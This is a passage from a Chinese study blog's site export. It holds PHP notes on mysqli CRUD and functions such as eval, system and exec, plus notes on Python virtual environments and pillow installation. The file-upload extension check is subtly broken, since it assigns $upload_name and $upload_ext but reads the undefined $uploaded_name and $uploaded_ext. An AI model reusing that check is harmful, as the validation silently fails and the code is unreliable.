&quot;&lt;td&gt;&quot;.$row[&#39;username&#39;].&quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&quot;.$row[&#39;password&#39;].&quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;&#x2F;tr&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        echo &quot;&lt;&#x2F;table&gt;&quot;</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#39;未查询到数据&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    $conn-&gt;close();&#x2F;&#x2F;数据库需要关闭，否则有安全隐患</span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><h1 id="php高级进阶"><a href="#php高级进阶" class="headerlink" title="php高级进阶"></a>php高级进阶</h1><h1 id="php数据库"><a href="#php数据库" class="headerlink" title="php数据库"></a>php数据库</h1><h2 id="php-Mysql"><a href="#php-Mysql" class="headerlink" title="php+Mysql"></a>php+Mysql</h2><h4 id="query-函数"><a href="#query-函数" class="headerlink" title="query()函数"></a>query()函数</h4><ul><li><p>履行SQL命令，不管如何通过PHP脚本与Mysql数据库交互，进程都是一样的，创建一个SQL语句，再传递给履行查询的函数。</p></li><li><p>在mysqli类中提供了几种履行SQL命令的方法，其中最经常使用的是query()方法。</p></li><li><p>对insert、update、delete等不会返回数据的SQL命令，query()方法在SQL命令成功履行时返回true。在此基础上还可以通过mysqli对象中的affected_rows属性猎取有多少条记录产生变化而且使用mysqli对象中的insert_id()方法可以返回最后1条insert命令生成的AUTO_INCREMENT编号值。</p></li><li><p>如果在履行SQL命令产生毛病，query()方法将返回false,此时可以通过mysqli对象中的errno、error属性获得毛病编号和毛病缘由。</p></li><li><p>注：query()方法每次调用只能履行1条SQL命令，如果想1次履行多条命令，就必须使用mysqli对象中的multi_query()方法。如果想以不同的参数屡次履行1条SQL命令，最有效力的办法是先对那条命令做1些预处理然后再履行。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mysqli</span>=<span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;mysql_user&quot;</span>,<span class="string">&quot;mysql_pwd&quot;</span>,<span class="string">&quot;my_db_name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;连接失败：%s&quot;</span>,mysqli_connect_error());</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*履行插入命令，并获得它的自动编号值*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mysqli</span>-&gt;query(<span class="string">&quot;insert into 表名(列1，列2) value (&#x27;值1,值2&#x27;)&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;改变的记录数：&quot;</span>.<span class="variable">$mysqli</span>-&gt;affected_rows.<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;新插入的ID值：&quot;</span>.<span class="variable">$mysqli</span>-&gt;insert_id.<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="创建并检测连接"><a href="#创建并检测连接" class="headerlink" title="创建并检测连接"></a>创建并检测连接</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$servername</span>=<span class="string">&quot;localhost&quot;</span>; <span class="comment">//定义一个服务器主机名，与win上的127.0.0.1类似</span></span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;root&quot;</span>;<span class="comment">//用来连接数据库用户名密码</span></span><br><span class="line"><span class="variable">$dbname</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"><span class="comment">//创建连接   mysqli自带对象，将连接对象存给变量conn</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测连接</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;  <span class="comment">//如果链接对象中connect_error返回失败</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;连接失败:&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error); <span class="comment">//die函数断掉连接同时用.返回错误,php使用点来连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;连接成功&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据库的查询（读取数据库）</span></span><br><span class="line"><span class="comment">//参考https://www.runoob.com/php/php-mysql-select.html 代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//准备一条数据库语句（sql语句）</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM table1 WHERE id &lt; 3&quot;</span>; <span class="comment">//将数据库中table1表中id项小于3的元素都选出来</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);<span class="comment">//执行建立的conn连接对象中query函数，将sql语句塞给数据库，将执行（query）结果返回给变量$result</span></span><br><span class="line"><span class="comment">//判断result有没有东西</span></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$result</span> -&gt;num_rows &gt; <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="comment">//输出数据</span></span><br><span class="line">     <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc())<span class="comment">//用while循环一条条去读取</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;------&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;------&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="comment">//这里返回的row类似于js对象数据，里面有每个条目的信息，包含了name，password等个体属性</span></span><br><span class="line">         <span class="comment">//这里输出是sql查询语句的子集关系，所以一般SQL选所有*</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;未查询到结果&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;close(); <span class="comment">//关闭数据库，防止一直占用，产生死锁</span></span><br></pre></td></tr></table></figure><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据库的增加数据（插入数据）</span></span><br><span class="line"><span class="comment">//参考 https://www.runoob.com/php/php-mysql-insert.html</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO table1 (id ,username,password) VALUE (8,&#x27;haha123&#x27;,&#x27;9999123&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)===<span class="literal">TRUE</span>)<span class="comment">//执行语句query是否成功，箭头运算使用query数据库查询函数，传递$sql这个数据库sql字符串变量到数据库中，返回ture或者false</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;插入成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error:&quot;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据的删除</span></span><br><span class="line"><span class="comment">//参考 https://www.runoob.com/php/php-mysql-delete.html</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM table1 WHERE username=&#x27;haha123&#x27; &quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)===<span class="literal">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据删除成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Error:&#x27;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据的修改（update）</span></span><br><span class="line"><span class="comment">//参考https://www.runoob.com/php/php-mysql-update.html</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE table1 SET password=&#x27;nibi123&#x27; WHERE username=&#x27;haha123&#x27; &quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)===<span class="literal">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据修改成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ERROR:&#x27;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="php与Ajax"><a href="#php与Ajax" class="headerlink" title="php与Ajax"></a>php与Ajax</h1><h1 id="php参考手册"><a href="#php参考手册" class="headerlink" title="php参考手册"></a>php参考手册</h1><p>当字典用，<br>[runoob上的参考手册]: (<a href="https://www.runoob.com/php/php-ref-array.html">https://www.runoob.com/php/php-ref-array.html</a>)</p><h3 id="stristr"><a href="#stristr" class="headerlink" title="stristr()"></a>stristr()</h3><ul><li>搜索字符串在另一字符串中的第一次出现。</li><li>该函数是二进制安全的。</li><li>该函数是不区分大小写的。如需进行区分大小写的搜索，使用 <a href="https://www.runoob.com/php/func-string-strstr.html">strstr()</a> 函数。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stristr(<span class="keyword">string</span>,search,before_search) </span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定被搜索的字符串。</td></tr><tr><td><em>search</em></td><td>必需。规定所搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td><em>before_search</em></td><td>可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p><p>如果在字符串中找到匹配，该函数会返回<strong>第一个</strong>匹配的字符位置。如果未找到匹配，则返回 FALSE。</p><h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(<span class="keyword">string</span>,start,length)</span><br></pre></td></tr></table></figure><p>返回字符串的一部分,从字符串的start位置开始，返回的字符串长度是length，为负数时 从字符串末端返回的长度，默认是直到字符串的结尾。</p><h3 id="uniqid"><a href="#uniqid" class="headerlink" title="uniqid()"></a>uniqid()</h3><p>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php实现对文件上传后缀检查与替换</span></span><br><span class="line"><span class="variable">$upload_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$upload_ext</span>=substr( <span class="variable">$uploaded_name</span>,strrpos(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);<span class="comment">//从.开始向后取后缀</span></span><br><span class="line"><span class="variable">$target_name</span>=md5(uniqid().<span class="variable">$uploaded_name</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$uploaded_ext</span>);<span class="comment">//对上传文件重命名</span></span><br><span class="line"><span class="keyword">if</span>(strtolower(<span class="variable">$uploaded_ext</span>)==<span class="string">&#x27;jpg&#x27;</span>||strtolower(<span class="variable">$uploaded_ext</span>)==<span class="string">&#x27;jpeg&#x27;</span>||strtolower(<span class="variable">$uploaded_ext</span>)==<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span>.<span class="variable">$target_name</span>);<span class="comment">//将临时文件移动到指定目录下</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$dir</span>.<span class="variable">$target_name</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;stored in: <span class="subst">$result</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;invalid file&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>evaluate，用来把一串字符串当做PHP语句执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo&#x27;hello world&#x27;;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>   <strong>system(string <code>$command</code>, int <code>&amp;$return_var</code> = ?): string</strong></p><p>和C的system()函数一样，执行里面第一个参数的命令；command参数是要执行的命令，如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中</p><h3 id="explode"><a href="#explode" class="headerlink" title="explode()"></a>explode()</h3><ul><li>把字符串打散为数组</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;www.runoob.com&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$str</span>)); <span class="comment">//以点为分隔符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="mysqli-real-escape-string"><a href="#mysqli-real-escape-string" class="headerlink" title="mysqli_real_escape_string()"></a>mysqli_real_escape_string()</h3><ul><li>转义在 SQL 语句中使用的字符串中的特殊字符,起到小的防火墙效果</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>connection</em></td><td>必需。规定要使用的 MySQL 连接。</td></tr><tr><td><em>escapestring</em></td><td>必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。</td></tr></tbody></table><h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><ul><li><p>是 HTTP Request 变量</p></li><li><p>默认情况下包含了 <a href="https://www.php.net/manual/zh/reserved.variables.get.php">$_GET</a>，<a href="https://www.php.net/manual/zh/reserved.variables.post.php">$_POST</a>  和  <a href="https://www.php.net/manual/zh/reserved.variables.cookies.php">$_COOKIE</a> 的数组。  </p></li></ul><blockquote><p><a href="https://www.php.net/manual/zh/reserved.variables.request.php">https://www.php.net/manual/zh/reserved.variables.request.php</a></p></blockquote><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><ul><li>执行一个外部程序</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> &amp;<span class="variable">$output</span> = ?, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ?): <span class="keyword">string</span>  <span class="comment">//exec执行command参数所指定的命令</span></span><br></pre></td></tr></table></figure><p>参数</p><ul><li><p><code>command</code></p><p> 要执行的命令。           </p></li><li><p><code>output</code></p><p>如果提供了<code>output</code> 参数，那么会用命令执行的输出填充此数组，每行输出填充数组中的一个元素数组中的数据不包含行尾的空白字符，例如 <code>\n</code> 字符</p><p>注意，如果数组中已经包含了部分元素，<strong>exec()</strong> 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加，请在传入 <strong>exec()</strong> 函数之前对数组使用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 函数进行重置。           </p></li><li><p><code>return_var</code></p><p>如果同时提供<code>output</code>  和 return_var` 参数，命令执行后的返回状态会被写入到此变量。           </p></li></ul><blockquote><p>详细学习见：<a href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a></p></blockquote><h3 id="system-1"><a href="#system-1" class="headerlink" title="system()"></a>system()</h3><ul><li>执行外部程序，并且显示输出</li><li>这些函数存在的意义，就是让用户通过php语言去执行系统的命令</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ?): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span></span><br><span class="line"><span class="comment">// 并且将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回值保存到 $retval。</span></span><br><span class="line"><span class="variable">$last_line</span> = system(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印更多信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="variable">$last_line</span> . <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="variable">$retval</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>更多参照官方文档：<a href="https://www.php.net/manual/zh/function.system.php">https://www.php.net/manual/zh/function.system.php</a></p></blockquote><h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><ul><li>检测变量是否已设置并且非 <strong><code>null</code></strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="keyword">mixed</span> <span class="variable">$var</span>, <span class="keyword">mixed</span> $... = ?): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.php.net/manual/zh/function.isset.php">https://www.php.net/manual/zh/function.isset.php</a></p></blockquote><h3 id="php-uname"><a href="#php-uname" class="headerlink" title="php_uname()"></a>php_uname()</h3><ul><li>返回运行 PHP 的系统的有关信息</li><li><strong>php_uname()</strong> 返回了运行 PHP 的操作系统的描述。   这和 <a href="https://www.php.net/manual/zh/function.phpinfo.php">phpinfo()</a> 最顶端上输出的是同一个字符串。   如果仅仅要获取操作系统的名称。可以考虑使用常量 **<code>PHP_OS</code>*<em>，不过要注意该常量会包含 PHP 构建（</em>built*）时的操作系统名。  </li><li>在一些旧的 UNIX 平台，它有可能无法检测到当前系统的信息，然后会还原显示成构建 PHP 时的系统信息。这仅仅在你的 uname() 函数库不存在或无法运行时发生。  </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_uname(<span class="keyword">string</span> <span class="variable">$mode</span> = <span class="string">&quot;a&quot;</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p><code>mode</code> 是单个字符，用于定义要返回什么信息：       </p><ul><li><code>&#39;a&#39;</code>：此为默认。包含序列 <code>&quot;s n r v m&quot;</code> 里的所有模式。                 </li><li><code>&#39;s&#39;</code>：操作系统名称。例如：FreeBSD`。                 </li><li><code>&#39;n&#39;</code>：主机名。例如：localhost.example.com`。                 </li><li><code>&#39;r&#39;</code>：版本名称，例如：5.1.2-RELEASE`。                 </li><li><code>&#39;v&#39;</code>：版本信息。操作系统之间有很大的不同。                 </li><li><code>&#39;m&#39;</code>：机器类型。例如：<code>i386</code>。                 </li></ul><blockquote><p><a href="https://www.php.net/manual/zh/function.php-uname.php">https://www.php.net/manual/zh/function.php-uname.php</a></p></blockquote><h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><ul><li>使用反斜线引用字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes(<span class="keyword">string</span> <span class="variable">$str</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/python%E8%BF%9B%E9%98%B6/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/python%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="关于虚拟环境"><a href="#关于虚拟环境" class="headerlink" title="关于虚拟环境"></a>关于虚拟环境</h1><h2 id="虚拟环境与包冲突"><a href="#虚拟环境与包冲突" class="headerlink" title="虚拟环境与包冲突"></a>虚拟环境与包冲突</h2><ul><li><p>venv存在的意义是：隔离不同项目所需要的不同package+使用不同python解释器版本的路径</p></li><li><p>在使用pycharm新建项目时，可以基于另外下载的解释器建立某个项目专属虚拟环境并且继承公共环境下的packages</p></li><li><p>有时候使用虚拟环境(venv)下的控制台安装某些库报错提示需要编译但是没有C++库，但win本机上却安过，可以用cmd本机环境变量中的python版本直接安装到虚拟环境的lib目录的包目录下。</p><ul><li>例如，在某次项目中由于要用到pillow图像处理库，打算在pycharm直接安装，结果报出错误：</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The headers or library files could not be found for zlib, a required dependency when compiling Pillow from source. </span><br></pre></td></tr></table></figure><ul><li>意思是说，pycharm在安装pillow包的时候需要先在镜像源下载源代码，然后用本地VS C++用于python的扩展来现场编译一些pyd文件（一种用C++写的然后编译好的带有函数接口目录的二进制文件以供python更高效的执行），但是在编译这个zlib的时候这个headers或者library文件我找不到。参考 <a href="https://www.cnblogs.com/jieself/p/14296040.html">https://www.cnblogs.com/jieself/p/14296040.html</a> 使用环境变量中的python3.10把这个库下载好直接送到基于python3.8解释器的venv的库中，随后pycharm由于解析到pillow之后import pillow下红色波浪线消失。</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -<span class="literal">-target</span>=D:\python_project\nenv\Lib\site<span class="literal">-packages</span> pillow==<span class="number">8.4</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li><p>但当运行程序时报错ImportError: cannot import name _imaging，流程为：pycharm—&gt;.py—&gt;python解释器—&gt;import pillow—&gt;pillow.xxx.py调用-imaging.py—&gt;发现解释器和这个imaging里的东西冲突，版本不对。</p></li><li><p>起初并没有指定8.4.0版本，所以即使用系统变量的python3.10强行将第三方包送进venv也不行。</p></li><li><p>随后uninstall pillow 10.x.x和imagehash（当时两个库安装的时候都出了问题，于是都强行target到venv）。此时用pycharm的venv控制台直接可以pip安装上低版本的两个库。</p></li><li><p>再次运行程序，报错不应该在numpy的目录下，原因是这个venv的numpy是pillow/imagehash安装时的依赖，版本也是高版本，因此uninstall numpy-1.26.1之后install自动安装了1.24.4</p></li><li><p>总之，以上这个案例说明，包版本非常重要，遇到编译错误时可以更换为低版本的包试试，可能会遇到二进制的包，在更换的时候还要把附带的依赖版本包也换掉最好，具体依赖了哪些，这在安装的时候会有log。</p></li><li><p>最重要的是**:one: pip install –only-binary :all: pillow :two: pip install –only-binary :all: pillow==8.4.0** 可以直接寻找最新版的二进制wheel文件来安装</p></li><li><p>对于需要本地编译的情况，官方不建议在windows上自己编译<a href="https://pillow.readthedocs.io/en/stable/index.html">Pillow (PIL Fork) 10.1.0 documentation</a> 建议直接安装预编译好的whl文件，太折腾</p></li></ul></li></ul><hr><p>之所以在开发时选择虚拟环境，除了避免库之间的冲突，还有重要的原因是方便部署，因为虚拟环境是独立的，仅包含了项目相关的依赖库，所以部署的效率更高，风险更小</p><h2 id="一般部署流程"><a href="#一般部署流程" class="headerlink" title="一般部署流程"></a>一般部署流程</h2><ol><li>开发完成后，使用 <code>pip freeze &gt; requirements.txt</code> 